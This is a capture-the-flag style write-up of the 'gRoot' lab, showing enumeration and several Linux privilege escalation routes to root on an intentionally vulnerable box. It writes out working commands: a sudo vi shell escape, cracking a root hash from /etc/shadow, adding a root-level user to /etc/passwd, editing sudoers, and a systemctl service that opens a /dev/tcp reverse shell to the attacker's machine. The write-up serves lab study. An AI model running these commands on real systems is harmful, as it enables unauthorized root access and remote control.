# I am gRoot
**Date:** July 5th 2022

**Author:** Jason Frank

<br>

## Initial Enumeration

### Nmap Scan

`sudo nmap -sV -sC -T4 -p- 10.50.153.253`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
OS details: Linux 3.10 - 3.13
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<br>

### Gobuster Scan

`gobuster dir -u http://10.50.153.253 -t 100 -r -x php,txt,html -w dir-med.txt`

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.50.153.253
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                dir-med.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2022/07/04 14:07:53 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 278]  
                                                 
===============================================================
2022/07/04 14:08:50 Finished
===============================================================
```

<br>

## Website Digging

Visiting the main page shows us it's a default Apache2 site that hasn't been configured yet:

![](images/gRoot/groot1.png)

There is no **robots.txt** file so we don't find anything useful there.

Viewing the page source code doesn't give us anything interesting either.

<br>

## System Access

In the lab instructions we are given a standard user to login with so I ssh over as that:

`ssh localuser@10.50.153.253`

```
The authenticity of host '10.50.153.253 (10.50.153.253)' can't be established.
ECDSA key fingerprint is SHA256:nm1P6H4TZAfwChxBdhLbyESrwOrlB+2zl+92OL6PS24.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.50.153.253' (ECDSA) to the list of known hosts.
localuser@10.50.153.253's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-1128-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

29 packages can be updated.
15 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed Jun 16 21:19:29 2021 from 10.50.132.89
localuser@ip-10-50-153-253:~$
```

<br>

## System Enumeration

The first thing I check is `sudo -l` and find the following:

```
sudo: unable to resolve host ip-10-50-153-253
Matching Defaults entries for localuser on ip-10-50-153-253:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User localuser may run the following commands on ip-10-50-153-253:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/vi
```

Knowing that there is a privilege escalation vulnerability when you're able to run **vi** as root I head over to **GTFOBins** and look it up there:

![](images/gRoot/groot2.png)

<br>

## Root

Running the command allows us to escalate our privileges to the root user:

`sudo vi -c ':!/bin/bash' /dev/null`

```
localuser@ip-10-50-153-253:~$ sudo vi -c ':!/bin/bash' /dev/null
sudo: unable to resolve host ip-10-50-153-253

root@ip-10-50-153-253:~# whoami
root
```

Looking in the **/root** directory we find a file called **flag.txt** and the contents are:

![](images/gRoot/groot3.png)

<br>

## Additional Privilege Escalation Methods

### #1 - .bakcup_shell

Looking in the **/home/localuser/Documents/backup/20210530_1830** directory shows us 2 files owned by the root user. One is an executable binary file and the other is a .sh script.

![](images/gRoot/groot4.png)

Looking at the file permissions shows us that it's a SUID file meaning we can run the script as the owning user and that happens to be root in this case. It also shows us that everyone has read and execute privileges. Combining those means we can not only run it, but we can run it as root.

Running `strings` on the binary file shows us that it calls the .sh script when ran:

![](images/gRoot/groot5.png)

Looking at the .sh file shows us:

`cat .script.sh`

```
echo "You Can't Find Me"
bash -i
```

So when we run the binary file it will execute the .sh script, which runs a shell, and all of this will be done as the root user spawning us a root shell and allowing us to escalate our privileges:

![](images/gRoot/groot6.png)

---

### #2 - Cracking the password hash of the root user

The **/etc/shadow** file is readable by everyone exposing the root users password hash:

`ls -al /etc/shadow`

```
-rw-r--r-- 1 root shadow 1131 Jul  4 13:58 /etc/shadow
```

`cat /etc/shadow | grep root`

```
root:$6$f8oZEFNA$UOFFeLjt0qwBJhokX0Jrl6dZyaYpvoCdyCaZasuYYBownvwoTGq7RafXBe/BT7A9xsOuDzUQ/icOqsPOLVdos/:18793:0:99999:7:::
```

Running that through hashcat cracks it pretty quickly:

`hashcat -m 1800 -w 3 -D 1,2 hash.txt rockyou.txt`

![](images/gRoot/groot7.png)

I then run `su root` and use the password that was just cracked to login as root:

![](images/gRoot/groot8.png)

If you're curious why the **/etc/shadow** file is set to 777 permissions check out **/etc/cron.hourly/rootme** which is a job that runs every hour and changes the permission on the file:

`cat /etc/cron.hourly/rootme`

```
#!/bin/bash 
 chmod 777 /etc/shadow
```

---

### #3 - World writeable /etc/passwd file

Looking at the permissions on **/etc/passwd** show us:

`ls -al /etc/passwd`

```
-rwxr--rw- 1 root root 1723 Jun 16  2021 /etc/passwd
```

I first create a new **sha512crypt** password hash of the word **jason** and then edit the **/etc/passwd** file to add my new jason user to it giving it the same permissions as root.

Once that's done I run `su jason` and login with the password **jason** and we get root:

![](images/gRoot/groot9.png)

---

### #4 - vim.basic SUID

Looking at the permission for **/usr/bin/vim.basic** shows us it has a SUID bit set:

`ls -al /usr/bin/vim.basic`

```
-rwsr-xr-x 1 root root 2441416 Oct 14  2020 /usr/bin/vim.basic
```

With this we can edit files only accessable by root as a standard user. For example if we try and display the **/etc/sudoers** file:

`cat /etc/sudoers`

```
cat: /etc/sudoers: Permission denied
```

But if we edit it with vim.basic:

`vim.basic /etc/sudoers`

![](images/gRoot/groot10.png)

It works, and on top of that we can change the file. We can change our localuser account to have full sudo access. I comment out the 2 lines at the bottom for our user and then add a line below the root account with ALL to everything:

![](images/gRoot/groot11.png)

Note: you have to use **:wq!** to get it to save the file.

Now when checking `sudo -l`:

```
sudo: unable to resolve host ip-10-50-153-253
Matching Defaults entries for localuser on ip-10-50-153-253:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User localuser may run the following commands on ip-10-50-153-253:
    (ALL : ALL) ALL
```

And running a quick `sudo bash` gets us a root shell:

```
localuser@ip-10-50-153-253:~$ sudo bash
sudo: unable to resolve host ip-10-50-153-253
root@ip-10-50-153-253:~# whoami
root
```

---

### #5 - systemctl SUID

The permissions on **/bin/systemctl** show us that the SUID bit is set:

`ls -al /bin/systemctl`

```
-rwsr-xr-x 1 root root 663944 Apr  2  2021 /bin/systemctl
```

I find a post online that explains how you can create a service which will connect back to your home machine and since systemctl starts the service as root you get a root shell.

I create the following file: **/tmp/test.service**

```
[Unit]
Description=privilege escalation using SUID systemctl

[Service]  
Type=simple
User=root  
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.50.130.229/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

Note: you'll need to change the IP address under ExecStart to your own systems IP.

I start a netcat listener up on my system with `nc -nvlp 4444`:

```
listening on [any] 4444 ...
```

I then enable the service with the following command:

`/bin/systemctl enable /tmp/test.service`

```
Created symlink from /etc/systemd/system/multi-user.target.wants/test.service to /tmp/test.service.
Created symlink from /etc/systemd/system/test.service to /tmp/test.service.
```

And then I start the service which connects back to our system and gives us a root shell:

`/bin/systemctl start test`

![](images/gRoot/groot12.png)

---

### #6 - CVE-2021-4034 (AKA PwnKit)

I downloaded a copy of PwnKit from github to my ESA machine and compiled it, then transferred it over to the gRoot box and made it executable. When running the exploit you immediately get root:

![](images/gRoot/groot13.png)

<br>

## Conclusion

There were many many ways to escalate privileges to root on this system and I had a lot of fun going through and finding as many as I could. I'm sure there are additional methods so go see if you can find any not listed here!